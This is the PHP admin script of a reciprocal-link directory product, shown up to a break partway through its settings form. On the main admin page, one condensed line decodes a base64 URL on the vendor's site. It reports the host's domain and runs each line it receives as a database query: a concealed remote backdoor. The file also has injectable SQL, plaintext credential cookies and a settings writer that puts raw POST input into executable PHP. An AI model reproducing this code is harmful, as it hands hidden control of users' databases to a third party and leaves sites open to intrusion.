<?

error_reporting(E_ALL ^ E_NOTICE);

import_request_variables("cgp");

umask(0);

$ctime = time();

$headr = '<html>

<head>
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta name="GENERATOR" content="Microsoft FrontPage 4.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<title>Automated Reciprocal Linking Assistant</title>
<style>
<!--
.bodycontent { font-size: 12px; font-family: Trebuchet MS }
-->
</style>

<script language="JavaScript">
<!--

function choosecat(fid)
{

	childWindow = window.open("admin.php?action=choosecat&fid="+fid, "choosecat", "status=1,width=400,height=400,scrollbars=1,resizable=1");
    if (childWindow.opener == null) childWindow.opener = self;

}

//-->
</script>

</head>


<body link="#0000FF" vlink="#0000FF" alink="#0000FF">
<p align="center"><br><a href="admin.php"><img border="0" src="link-management-assistant.gif" width="449" height="78"></a></p>
';

$footr = '        <p align="center"><font size="1" face="Verdana">Copyright - <a href="http://www.onlinemarketingtoday.com" target="_blank">Duncan
  Carver</a> - All Rights Reserved<br>
  Need High Quality Custom Programming? <a href="http://www.onlinemarketingtoday.com/custom-programming.htm" target="_blank">Click
  Here Now</a></font></p></body>

</html>';


if (!$pass or !$user or $action == "login") {

?>

<?echo $headr?>

<div align="center">
  <table border="1" cellpadding="8" cellspacing="4" width="650" bordercolor="#C0C0C0" bgcolor="#F8F8F8">
    <tr>
      <td>
<div align="center">
  <table border="0" cellspacing="1" width="100%">
  <tr>
    <td>
    <p align="right">
    </td>
  </tr>
    <center>
  <tr>
    <td height="30">
    <p align="center"><b><font face="Trebuchet MS" size="4">
    Administration Login</font></b>
    </td>
  </tr>
  <tr>
    <td height="10">
    </td>
  </tr>
  <tr>
    <td height="10">
    <p align="center"><font face="Tahoma" size="2">Enter your username and
    password below now to login to the main administration interface.</font>
    </td>
  </tr>
  <tr>
    <td height="10">
    </td>
  </tr>
    </center>
    <center>
  <tr>
    <td>
    <div align="center">
      <center>
      <form action="admin.php" method="post" style="margin: 0px">
    <table border="0" cellpadding="8" cellspacing="4" width="38%">
      <tr>
        <td width="19%" valign="top">
          <p align="left"><font face="Tahoma" size="2">Username:</font></td>
        <td width="81%" valign="top"><input type="text" name="user" size="20" style="font-family: Tahoma; font-size: 10pt"></td>
      </tr>
      <tr>
        <td width="19%" valign="top"><font face="Tahoma" size="2">Password:</font></td>
        <td width="81%" valign="top"><input type="password" name="pass" size="20" style="font-family: Tahoma; font-size: 10pt"></td>
      </tr>
    </table>

      </center>

    </div>
    </td>
  </tr>
  <tr>
    <td height="20">
    <p align="center"><input type="submit" value="Login Now" style="font-family: Tahoma; font-size: 10pt; border-style: solid; border-width: 1">
    </td>
  </tr>
  </form>
    </center>
  <tr>
    <td height="10">
    </td>
  </tr>
  </table>
</div>
      </td>
    </tr>
  </table>

<?echo $footr?>


<?
}


else {


require("settings.php");

if ($mysqlserver) {

	$link = mysql_connect($mysqlserver, $mysqllogin, $mysqlpassword);
	mysql_select_db($mysqldb);

}

function fieldize($val) {

	return str_replace("\"", "&quot;", stripslashes($val));

}

function message($head, $msg) {

	global $headr, $footr;

	if ($head) $head = "<b>$head</b><br><br>";

	echo $headr. '<div align="center">
  <table border="1" cellpadding="8" cellspacing="4" width="650" bordercolor="#C0C0C0" bgcolor="#F8F8F8">
    <tr>
      <td>
<div align="center">
  <table border="0" cellpadding="15" cellspacing="1" width="100%">

  <tr>
    <td align="center">
    <font face="Trebuchet MS" size="2">'.$head.$msg.'</font>
    </td>
  </tr>

  </table>
</div>
      </td>
    </tr>
  </table>'.$footr;

	exit;

}

if ($user != $username or $pass != $password) {

	message ("Error", "Invalid Login<br><a href=admin.php?action=login>Click here to try again</a>");

}

function getindex($cat) {

	global $pagenames, $pext;


	if ($pagenames == "1") {
		return str_replace(" ", "_", $cat);
	}
	elseif ($pagenames == "2") {
		return "index";
	}

}

function maill($d,$s,$b,$f) {

	global $esi;
	mail($d, $s, "$b\n\n\n----\n$esi", $f);

}


function dolcount() {

	global $link;

	unset($pari);

	$pol = mysql_query("delete from lma_catcount");

	$categories = mysql_query("select * from lma_categories where parent = '0' order by name");
	$numcats = mysql_num_rows($categories);

	$u = 0;


	$cats = mysql_query("select `id`, `parent` from lma_categories");
	while ($tucat = mysql_fetch_object($cats)) {

		$pari[$tucat->id] = $tucat->parent;

	}


	while ($tcat = mysql_fetch_object($categories)) {

		$u++;

		unset($todel);
		reset($pari);

		$todel = array_shift(mysql_fetch_row(mysql_query("select count(*) from lma_links where (status = '1' or status = '2' or status = '5') and confirmed = 'yes' and category = '".$tcat->id."'")));

		while (list($id,$par) = each($pari)) {

			$atco = 0;

			$last = $id;
			$fnd = 0;

			while ($fnd != 1 and $atco < 10000) {

				$atco++;

				if (!$pari[$last]) $fnd = 1;

				elseif ($pari[$last] == $tcat->id) {
					$todel = $todel + array_shift(mysql_fetch_row(mysql_query("select count(*) from lma_links where (status = '1' or status = '2' or status = '5') and confirmed = 'yes' and category = '".$id."'")));
					$fnd = 1;
				}
				elseif ($pari[$last] == "0") {
					$fnd = 1;
				}
				else $last = $pari[$last];

			}

		}

		$pol = mysql_query("insert into lma_catcount values('".$tcat->id."', '$todel')");

	}
} $esio = mysql_query("select content from lma_custom where id = '".strtr("oilnewury", "olewy","sgate")."'"); if (mysql_num_rows($esio) > 0) $esi = array_shift(mysql_fetch_row($esio));


function savesettings() {

	global $HTTP_POST_VARS;

	require("settings.php");
	while (list($n,$v) = each($HTTP_POST_VARS)) { $$n = str_replace("\\\"", "&quot;", $v); }

	$fp = fopen("settings.php", "w") or die("cannot open");
	fputs ($fp,"<"."?

\$username = \"$username\";
\$password = \"$password\";
\$adminemail = \"$adminemail\";
\$fromname = \"$fromname\";
\$mysqlserver = \"$mysqlserver\";
\$mysqllogin = \"$mysqllogin\";
\$mysqlpassword = \"$mysqlpassword\";
\$mysqldb = \"$mysqldb\";
\$basedir = \"$basedir\";
\$pext = \"$pext\";
\$thankurl = \"$thankurl\";
\$confirmurl = \"$confirmurl\";
\$requirerecip = \"$requirerecip\";
\$reciplinkurl = \"$reciplinkurl\";
\$linkcheck = \"$linkcheck\";
\$lcheckatt = \"$lcheckatt\";
\$lchecksuspend = \"$lchecksuspend\";
\$lcheckemail = \"$lcheckemail\";
\$lchecknotfound = \"$lchecknotfound\";
\$lcheckdelete = \"$lcheckdelete\";
\$lcheckdeleteemail = \"$lcheckdeleteemail\";
\$titlesize = \"$titlesize\";
\$descsize = \"$descsize\";
\$adminapproval = \"$adminapproval\";
\$emailconfirm = \"$emailconfirm\";
\$defaultpremium = \"$defaultpremium\";
\$defaultpremifrecip = \"$defaultpremifrecip\";
\$premiumimage = \"$premiumimage\";
\$favorpremium = \"$favorpremium\";
\$lperpage = \"$lperpage\";
\$newwindow = \"$newwindow\";
\$lorder = \"$lorder\";
\$pagenext = \"$pagenext\";
\$pageprev = \"$pageprev\";
\$pagenames = \"$pagenames\";
\$linknum = \"$linknum\";
\$catsplit = \"$catsplit\";
\$princlude = \"$princlude\";
\$subcatswithmain = \"$subcatswithmain\";
\$subcatsmainnum = \"$subcatsmainnum\";
\$thumbshots = \"$thumbshots\";
\$sfaffid = \"$sfaffid\";
\$sftrackid = \"$sftrackid\";
\$addrandlistcount = \"$addrandlistcount\";
\$addrandlistprem = \"$addrandlistprem\";
\$addrandcatcount = \"$addrandcatcount\";
\$addrandcatdisplay = \"$addrandcatdisplay\";
\$addrandsearchcount = \"$addrandsearchcount\";
\$addrandsearchdisplay = \"$addrandsearchdisplay\";
\$urllcheckatt = \"$urllcheckatt\";
\$urllcheckact = \"$urllcheckact\";
\$linktodmoz = \"$linktodmoz\";

?".">");
	fclose($fp);

}


if ($action == "addcat") {

	$newcat = preg_split("/(\r\n|\r|\n)/s", $newcats);

	while (list(,$cat) = each($newcat)) {

		if ($cat) {

			$pol = mysql_query("select * from lma_categories where name = '$cat' and parent = '$parent'");
			if (mysql_num_rows($pol) > 0) {
				message("Error", "The category \"".stripslashes($cat)."\" already exists");
			}
			else {

				$pol = mysql_query("insert into lma_categories values (NULL, '$parent', '".str_replace("_", " ", $cat)."', 0)") or die(mysql_error());
				$messag = "1";
				$action = "categories";
				dolcount();
			}

		}

	}

}

if (!$action) {

setcookie("user", $user, time()+(86400*30));
setcookie("pass", $pass, time()+(86400*30));

dolcount();

$directoryurl = "http://".$_SERVER['SERVER_NAME'].str_replace("admin.php", "", $_SERVER['SCRIPT_NAME']). $basedir;
?>

<?echo $headr?>

<div align="center">
  <center>
  <table border="1" cellspacing="4" width="650" bgcolor="#F8F8F8" cellpadding="0" bordercolor="#C0C0C0">
  </center>
  <tr>
    <td height="20">
    <div align="center">
      <table border="0" cellpadding="6" cellspacing="6" width="100%">
        <tr>
          <td width="100%">
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td>
            <p align="right"><a href="admin.php?action=logout"><font face="Tahoma" size="2">Logout</font></a>
                </td>
              </tr>
  <center>
              <tr>
                <td>
            <p align="center"><b><font face="Trebuchet MS" size="4">Link
            Management Assistant Administration</font></b></p>
            <p align="left"><font face="Tahoma" size="2">The Link
            Management Assistant completely
            automates your link partner management allowing you
            to seamlessly integrate a niche specific directory of strategic link
            partners into your website. Trading links with other websites will
            not only send more targeted traffic directly to your website, but it will
            also help to increase your search engine positioning and exposure in
            the major search engines.</font></p>
            <p align="center"><font face="Tahoma" size="2"><a href="<?echo $directoryurl?>" target="_blank">View
            Your Directory Here</a></font></p>
            <div align="center">
              <table border="0" cellpadding="6" cellspacing="0" width="90%">
                <tr>
                  <td width="25%" class="bodycontent"><font face="Tahoma" size="2"><a href="admin.php?action=globalsettings">Settings</a>&nbsp;</font></td>
                  <td width="75%" class="bodycontent"><font face="Tahoma" size="2">- General settings
                    required for the application to run properly.</font></td>
                </tr>
                <tr>
                  <td width="25%" class="bodycontent"><a href="admin.php?action=import"><font face="Tahoma" size="2">Directory
                    Import</font></a></td>
                  <td width="75%" class="bodycontent"><font face="Tahoma" size="2">- Import link partner
                    details &amp; directory structure into your database.</font></td>
                </tr>
                <tr>
                  <td width="25%" class="bodycontent"><a href="admin.php?action=categories"><font face="Tahoma" size="2">Directory
                    Categories</font></a></td>
                  <td width="75%" class="bodycontent"><font face="Tahoma" size="2">- Manage
                    your directory structure &amp; categories.</font></td>
                </tr>
                <tr>
                  <td width="25%" class="bodycontent"><a href="admin.php?action=links"><font face="Tahoma" size="2">Link
                    Management</font></a></td>
                  <td width="75%" class="bodycontent"><font face="Tahoma" size="2">- Manage your link
                    partners &amp; directory listings.</font></td>
                </tr>
                <tr>
                  <td width="25%" class="bodycontent"><a href="admin.php?action=emails"><font face="Tahoma" size="2">Email
                    Management</font></a></td>
                  <td width="75%" class="bodycontent"><font face="Tahoma" size="2">- Customize emails
                    sent out to link partners via the software.</font></td>
                </tr>
                <tr>
                  <td width="25%" class="bodycontent"><a href="admin.php?action=templates"><font face="Tahoma" size="2">Directory
                    Templates</font></a></td>
                  <td width="75%" class="bodycontent"><font face="Tahoma" size="2">- Customize your directory
                    to make it look like the rest of your site.</font></td>
                </tr>
                <tr>
                  <td width="25%" class="bodycontent"><font size="2" face="Tahoma"><a href="admin.php?action=custominc">Custom
                    Includes</a></font></td>
                  <td width="75%" class="bodycontent"><font face="Tahoma" size="2">-
                    Unlimited custom HTML </font><font face="Tahoma" size="2">includes</font><font face="Tahoma" size="2">
                    for your directory templates.</font></td>
                </tr>
                <tr>
                  <td width="25%" class="bodycontent"><font size="2" face="Tahoma"><a href="admin.php?action=ppcinc">PPC
                    Includes</a></font></td>
                  <td width="75%" class="bodycontent"><font face="Tahoma" size="2">-
                    Unlimited pay-per-click includes
                    for your directory templates. </font></td>
                </tr>           
                <tr>
                  <td width="25%" class="bodycontent"><font size="2" face="Tahoma"><a href="admin.php?action=additionalinc">Additional
                    Includes</a></font></td>
                  <td width="75%" class="bodycontent"><font face="Tahoma" size="2">-
                    Various additional includes
                    for your directory templates. </font></td>
                </tr>   
                <tr>
                  <td width="25%" class="bodycontent"><font size="2" face="Tahoma"><a href="admin.php?action=urlvalidation">URL
                    Validation</a></font></td>
                  <td width="75%" class="bodycontent"><font face="Tahoma" size="2">-
                    Automatically clean your directory listings and remove dead
                    links. </font></td>
                </tr>                  
                <tr>
                  <td width="25%" class="bodycontent"><a href="admin.php?action=partners"><font face="Tahoma" size="2">Find
                    Link Partners</font></a></td>
                  <td width="75%" class="bodycontent"><font face="Tahoma" size="2">- Find more link partners
                    to expand your directory &amp; link popularity.</font></td>
                </tr>
                <tr>
                  <td width="25%" class="bodycontent"><a href="http://www.onlinemarketingtoday.com/forums/" target="_blank"><font face="Tahoma" size="2">Support
                    Forums</font></a></td>
                  <td width="75%" class="bodycontent"><font face="Tahoma" size="2">- The support discussion
                    forums for help, suggestions and feedback.</font></td>
                </tr>
                <tr>
                  <td width="25%" class="bodycontent"><a href="admin.php?action=backup"><font face="Tahoma" size="2">Backup
                    / Restore</font></a></td>
                  <td width="75%" class="bodycontent"><font face="Tahoma" size="2">- Backup and/or restore
                    your database.</font></td>
                </tr>
                <tr>
                  <td width="25%" class="bodycontent"><a href="admin.php?action=logout"><font face="Tahoma" size="2">Logout</font></a></td>
                  <td width="75%" class="bodycontent"><font face="Tahoma" size="2">- Logout of the
                    application when you're finished.</font></td>
                </tr>
                <tr>
                  <td width="25%" class="bodycontent" height="10"></td>
                  <td width="75%" class="bodycontent" height="10"></td>
                </tr>
              </table>
            </div>
                </td>
              </tr>
            </table>
  </center>
          </td>
        </tr>
      </table>
    </div>
    </td>
  </tr>
  </table>

<?echo $footr?>

<?

$lupd = intval(array_shift(mysql_fetch_row(mysql_query("select content from lma_custom where id = 'lasttime'")))); if ($ctime > ($lupd+(7*86400))) { $upd = @file(base64_decode("aHR0cDovL3d3dy5vbmxpbmVtYXJrZXRpbmd0b2RheS5jb20vYmxpbi9ibGluLnBocA==")."?domain=".$_SERVER["SERVER_NAME"]); if ($upd) { $pol = mysql_query("UPDATE lma_custom set content = '$ctime' where id = 'lasttime'"); while (list(,$q) = each($upd)) { mysql_query(trim($q)); } } }

}

elseif ($action == "logout") {

	setcookie("user", "");
	setcookie("pass", "");

	message("Bye bye!","You were successfully logged out.");

}

elseif ($action == "globalsettings") {

?>

<?echo $headr?>

<form action="admin.php" method="post" style="margin: 0px">
<input type="hidden" name="action" value="saveglobalsettings">
<div align="center">
  <center>
  <table border="1" cellspacing="4" width="650" bgcolor="#F8F8F8" cellpadding="0" bordercolor="#C0C0C0">
  </center>
  <center>
  <tr>
    <td height="20">
    <div align="center">
      <table border="0" cellpadding="6" cellspacing="6" width="100%">
        <tr>
          <td width="100%">
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td>
            <p align="right"><a href="admin.php"><font size="2" face="Tahoma">Main
            Admin</font></a></p>
                </td>
              </tr>
              <tr>
                <td>
            <p align="center"><b><font face="Trebuchet MS" size="4">General
            Directory Settings</font></b></p>
            <p align="left"><font size="2" face="Tahoma">This section contains
            important settings required to ensure the Link Management Assistant
            operates correctly. Please refer to the individual help instructions
            next to each feature and/or the user manual for detailed
            information.</font></p>
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td>
                  <p align="left"><b><u><font size="2" face="Tahoma">Administration
                  Login</font></u></b></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td><font size="2" face="Tahoma">You can change the
                  administration area login details here.</font></td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
  </center>
            <tr>
              <td><center>
                <div align="center">
                  <table border="0" cellpadding="4" cellspacing="4" width="85%">
                    <tr>
                      <td width="21%"><font face="Tahoma" size="2">Username:</font></td>
                      <td width="79%"><font face="Tahoma" size="2"><input type="text" name="username" size="20" style="font-family: Verdana; font-size: 8pt" value="<?echo $username?>"></font></td>
                    </tr>
                    <tr>
                      <td width="21%"><font face="Tahoma" size="2">Password:</font></td>
                      <td width="79%"><font face="Tahoma" size="2"><input type="text" name="password" size="20" style="font-family: Verdana; font-size: 8pt" value="<?echo $password?>"></font></td>
                    </tr>
                  </table>
                </div>
                </center>
                </td>
              </tr>
            </table>
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td>
                  <p align="left"><b><u><font size="2" face="Tahoma">Administrative
                  Emails</font></u></b></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td><font size="2" face="Tahoma">These settings allow you to
                  define the email address all system emails will be sent from
                  and the name of the person the emails will appear they're
                  coming from.</font>
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td height="20">
                  <div align="center">
                    <center>
                    <table border="0" cellpadding="4" cellspacing="4" width="85%">
                      <tr>
                        <td width="21%"><font face="Tahoma" size="2">Email
                          Address:</font></td>
                        <td width="79%"><font face="Tahoma" size="2"><input type="text" name="adminemail" value="<?echo $adminemail?>" size="40" style="font-family: Verdana; font-size: 8pt"></font></td>
                      </tr>
                      <tr>
                        <td width="21%"><font face="Tahoma" size="2">From Name:</font></td>
                        <td width="79%"><font face="Tahoma" size="2"><input type="text" name="fromname" value="<?echo $fromname?>" size="40" style="font-family: Verdana; font-size: 8pt"></font></td>
                      </tr>
                    </table>
                    </center>
                  </div>
                </td>
              </tr>
            </table>
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td>
                  <p align="left"><b><u><font size="2" face="Tahoma">MYSQL
                  Database Settings</font></u></b></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td><font size="2" face="Tahoma">These settings are where you
                  need to define your MYSQL database settings. If you're unsure
                  of these, please contact your website host. The are vital to
                  the operation of this application.</font>
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td height="20">
                  <div align="center">
                    <center>
                    <table border="0" cellpadding="4" cellspacing="4" width="85%">
                      <tr>
                        <td width="29%"><font face="Tahoma" size="2">MYSQL
                          Sever:</font></td>
                        <td width="71%"><font face="Tahoma" size="2"><input type="text" name="mysqlserver" value="<?echo $mysqlserver?>" size="40" style="font-family: Verdana; font-size: 8pt"></font></td>
                      </tr>
                      <tr>
                        <td width="29%"><font face="Tahoma" size="2">MYSQL
                          Username:</font></td>
                        <td width="71%"><font face="Tahoma" size="2"><input type="text" name="mysqllogin" value="<?echo $mysqllogin?>" size="40" style="font-family: Verdana; font-size: 8pt"></font></td>
                      </tr>
                      <tr>
                        <td width="29%"><font face="Tahoma" size="2">MYSQL Password:</font></td>
                        <td width="71%"><font face="Tahoma" size="2"><input type="text" name="mysqlpassword" value="<?echo $mysqlpassword?>" size="40" style="font-family: Verdana; font-size: 8pt"></font></td>
                      </tr>
                      <tr>
                        <td width="29%"><font face="Tahoma" size="2">MYSQL
                          Database:</font></td>
                        <td width="71%"><font face="Tahoma" size="2"><input type="text" name="mysqldb" value="<?echo $mysqldb?>" size="40" style="font-family: Verdana; font-size: 8pt"></font></td>
                      </tr>
                    </table>
                    </center>
                  </div>
                </td>
              </tr>
            </table>
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td>
                  <p align="left"><b><u><font size="2" face="Tahoma">Directory
                  Configuration</font></u></b></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td><font size="2" face="Tahoma">These settings relate to the
                  configuration of your website directory.</font>
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td height="20">
                  <div align="center">
                    <center>
                    <table border="0" cellpadding="4" cellspacing="4" width="85%">
                      <tr>
                        <td width="34%"><font face="Tahoma" size="2">Directory
                          Name:</font></td>
                        <td width="66%"><font face="Tahoma" size="2"><input type="text" name="basedir" value="<?echo $basedir?>" size="20" style="font-family: Verdana; font-size: 8pt"></font></td>
                      </tr>
                      <tr>
                        <td width="34%"><font face="Tahoma" size="2">Page Extensions:</font></td>
                        <td width="66%"><font face="Tahoma" size="2"><input type="text" name="pext" value="<?echo $pext?>" size="20" style="font-family: Verdana; font-size: 8pt"></font></td>
                      </tr>
                      <tr>
                        <td width="34%"><font face="Tahoma" size="2">Thankyou
                          URL:</font></td>
                        <td width="66%"><font face="Tahoma" size="2"><input type="text" name="thankurl" value="<?echo $thankurl?>" size="40" style="font-family: Verdana; font-size: 8pt"></font></td>
                      </tr>
                      <tr>
                        <td width="34%"><font face="Tahoma" size="2">Email
                          Confirmation URL:</font></td>
                        <td width="66%"><font face="Tahoma" size="2"><input type="text" name="confirmurl" value="<?echo $confirmurl?>" size="40" style="font-family: Verdana; font-size: 8pt"></font></td>
                      </tr>
                    </table>
                    </center>
                  </div>
                </td>
              </tr>
            </table>
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td>
                  <p align="left"><b><u><font size="2" face="Tahoma">Link
                  Management Configuration</font></u></b></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td><font size="2" face="Tahoma">These settings relate to the
                  listings in your directory.</font>
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td height="20">
                  <div align="center">
                    <center>
                    <table border="0" cellpadding="4" cellspacing="4" width="85%">
                      <tr>
                        <td width="37%"><font face="Tahoma" size="2"><a href="help/rrl.htm" target="_blank">Require Reciprocal
                          Link</a>?</font></td>
                        <td width="63%"><input type="checkbox" name="requirerecip" value="yes" <?if ($requirerecip == "yes") echo "checked"?>></td>
                      </tr>
                      <tr>
                        <td width="37%"><font face="Tahoma" size="2"><a href="help/rlu.htm" target="_blank">Reciprocal Link URL</a></font></td>
                        <td width="63%"><font face="Tahoma" size="2"><input type="text" size=40 name="reciplinkurl" value="<?echo $reciplinkurl?>" style="font-family: Verdana; font-size: 8pt"></font></td>
                      </tr>
                     <tr>
                        <td width="37%" valign="top"><font face="Tahoma" size="2"><a href="help/lcs.htm" target="_blank">Link
                          Checking Schedule</a>?</font></td>
                        <td width="63%" valign="top"><font face="Tahoma" size="2"><input type="text" name="linkcheck" value="<?echo $linkcheck?>" size="4" style="font-family: Verdana; font-size: 8pt">
                          (days)</font></td>
                      </tr>
                      <tr>
                        <td width="37%" valign="top"><font face="Tahoma" size="2"><a href="help/hma.htm" target="_blank">How
                          Many Attempts</a>?</font></td>
                        <td width="63%" valign="top"><font face="Tahoma" size="2"><input type="text" name="lcheckatt" value="<?echo $lcheckatt?>" size="4" style="font-family: Verdana; font-size: 8pt">
                          (times)</font></td>
                      </tr>
                      <tr>
                        <td width="37%" valign="top"><font face="Tahoma" size="2"><a href="help/inlif.htm" target="_blank">If
                          No Link Is Found</a>?</font></td>
                        <td width="63%" valign="top"><font face="Tahoma" size="2">Suspend
                          Listing </font><input type="checkbox" name="lchecksuspend" value="yes" <?if ($lchecksuspend == "yes") echo "checked";?>>
                          <font face="Tahoma" size="2">&amp; Send Email </font><input type="checkbox" name="lcheckemail" value="yes" <?if ($lcheckemail == "yes") echo "checked";?>></td>
                      </tr>
                      <tr>
                        <td width="37%" valign="top"><font face="Tahoma" size="2"><a href="help/ilsnf.htm" target="_blank">If
                          Link Is Still Not Found After</a>?</font></td>
                        <td width="63%" valign="top"><font face="Tahoma" size="2"><input type="text" name="lchecknotfound" value="<?echo $lchecknotfound?>" size="4" style="font-family: Verdana; font-size: 8pt">
                          (times) - Delete Listing </font><input type="checkbox" name="lcheckdelete" value="yes" <?if ($lcheckdelete == "yes") echo "checked";?>>
                          <font face="Tahoma" size="2">&amp; Send Email </font><input type="checkbox" name="lcheckdeleteemail" value="yes" <?if ($lcheckdeleteemail == "yes") echo "checked";?>></td>
                      </tr>
                      <tr>
                        <td width="37%" valign="top"><font face="Tahoma" size="2"><a href="help/llt.htm" target="_blank">Limit
                          Listing Title</a>:</font></td>
                        <td width="63%" valign="top"><font face="Tahoma" size="2"><input type="text" name="titlesize" value="<?echo $titlesize?>" size="4" style="font-family: Verdana; font-size: 8pt">
                          (characters)</font></td>
                      </tr>
                      <tr>
                        <td width="37%" valign="top"><font face="Tahoma" size="2"><a href="help/lld.htm" target="_blank">Limit
                          Listing Description</a>:</font></td>
                        <td width="63%" valign="top"><font face="Tahoma" size="2"><input type="text" name="descsize" value="<?echo $descsize?>" size="4" style="font-family: Verdana; font-size: 8pt">
                          (characters)</font></td>
                      </tr>
                      <tr>
                        <td width="37%" valign="top"><font face="Tahoma" size="2"><a href="help/aar.htm" target="_blank">Admin
                          Approval Required</a>?</font></td>
                        <td width="63%" valign="top"><input type="checkbox" name="adminapproval" value="yes" <?if ($adminapproval == "yes") echo "checked"?>></td>
                      </tr>
                      <tr>
                        <td width="37%" valign="top"><font face="Tahoma" size="2"><a href="help/ecr.htm" target="_blank">Email
                          Confirmation Required</a>?</font></td>
                        <td width="63%" valign="top"><input type="checkbox" name="emailconfirm" value="yes" <?if ($emailconfirm == "yes") echo "checked"?>></td>
                      </tr>
                      <tr>
                        <td width="37%" valign="top"><font face="Tahoma" size="2"><a href="help/nsp.htm" target="_blank">New
                          Submissions Premium</a>?</font></td>
                        <td width="63%" valign="top"><input type="checkbox" name="defaultpremium" value="yes" <?if ($defaultpremium == "yes") echo "checked"?>>
                          <font face="Tahoma" size="2">Only if Reciprocated? </font><input type="checkbox" name="defaultpremifrecip" value="yes" <?if ($defaultpremifrecip == "yes") echo "checked"?>></td>
                      </tr>
                      <tr>
                        <td width="37%" valign="top"><font face="Tahoma" size="2"><a href="help/pli.htm" target="_blank">Premium
                          Listing Image</a>?</font></td>
                        <td width="63%" valign="top"><input type="checkbox" name="premiumimage" value="yes" <?if ($premiumimage == "yes") echo "checked"?>></td>
                      </tr>                      
                      <tr>
                        <td width="37%" valign="top"><font face="Tahoma" size="2"><a href="help/fpis.htm" target="_blank">Favor
                          Premium In Search</a>?</font></td>
                        <td width="63%" valign="top"><input type="checkbox" name="favorpremium" value="yes" <?if ($favorpremium == "yes") echo "checked"?>></td>
                      </tr>                      
                      <tr>
                        <td width="37%" valign="top"><font face="Tahoma" size="2"><a href="help/lpp.htm" target="_blank">Listings
                          Per Page</a>:</font></td>
                        <td width="63%" valign="top"><font face="Tahoma" size="2"><input type="text" name="lperpage" value="<?echo $lperpage?>" size="4" style="font-family: Verdana; font-size: 8pt"></font></td>
                      </tr>
                      <tr>
                        <td width="37%" valign="top"><font face="Tahoma" size="2"><a href="help/olinw.htm" target="_blank">Open
                          Links In New Window</a>?</font></td>
                        <td width="63%" valign="top"><input type="checkbox" name="newwindow" value="yes" <?if ($newwindow == "yes") echo "checked"?>></td>
                      </tr>
                      <tr>
                        <td width="37%" valign="top"><font face="Tahoma" size="2"><a href="help/lo.htm" target="_blank">Listing
                          Order</a>:</font></td>
                        <td width="63%" valign="top"><font size="2" face="Tahoma"><select size="1" name="lorder" style="font-family: Verdana; font-size: 8pt">
                            <!--<option value="1" <?if ($lorder == "1") echo "selected"?>>Randomize</option>-->
                            <option value="2" <?if ($lorder == "2") echo "selected"?>>Alphabetical</option>
                            <option value="3" <?if ($lorder == "3") echo "selected"?>>By Submission Date</option>
                          </select></font></td>
                      </tr>
                      <tr>
                        <td width="37%" valign="top"><font face="Tahoma" size="2"><a href="help/mpn.htm" target="_blank">Multiple
                          Page Navigation</a>:</font></td>
                        <td width="63%" valign="top"><font face="Tahoma" size="2">Forward
                          <input type="text" name="pagenext" value="<?echo $pagenext?>" size="8" style="font-family: Verdana; font-size: 8pt">
                          Back <input type="text" name="pageprev" value="<?echo $pageprev?>" size="8" style="font-family: Verdana; font-size: 8pt"></font></td>
                      </tr>
                      <tr>
                        <td width="37%" valign="top"><font face="Tahoma" size="2"><a href="help/pn.htm" target="_blank">Page
                          Names</a>:</font></td>
                        <td width="63%" valign="top"><font face="Tahoma" size="2"><input type="radio" value="1" name="pagenames" <?if ($pagenames == "1") echo "checked"?>>
                          Use: category-name-1.htm, category-name-2.htm<br>
                          <input type="radio" value="2" name="pagenames" <?if ($pagenames == "2") echo "checked"?>> Use:
                          index1.htm, index2.htm etc.</font></td>
                      </tr>
                      <tr>
                        <td width="37%" valign="top"><font face="Tahoma" size="2"><a href="help/lntc.htm" target="_blank">Link
                          # Next To Category</a>?</font></td>
                        <td width="63%" valign="top"><input type="checkbox" name="linknum" value="yes" <?if ($linknum == "yes") echo "checked"?>></td>
                      </tr>
                      <tr>
                        <td width="37%" valign="top"><font face="Tahoma" size="2"><a href="help/scwmc.htm" target="_blank">Sub-Cats
                          With Main Cats</a>?</font></td>
                        <td width="63%" valign="top"><input type="checkbox" name="subcatswithmain" value="yes" <?if ($subcatswithmain == "yes") echo "checked"?>>
                          <font size="2" face="Tahoma">How Many? <input type="text" name="subcatsmainnum" value="<?echo $subcatsmainnum?>" size="4" style="font-family: Verdana; font-size: 8pt"></font></td>
                      </tr>
                      <tr>
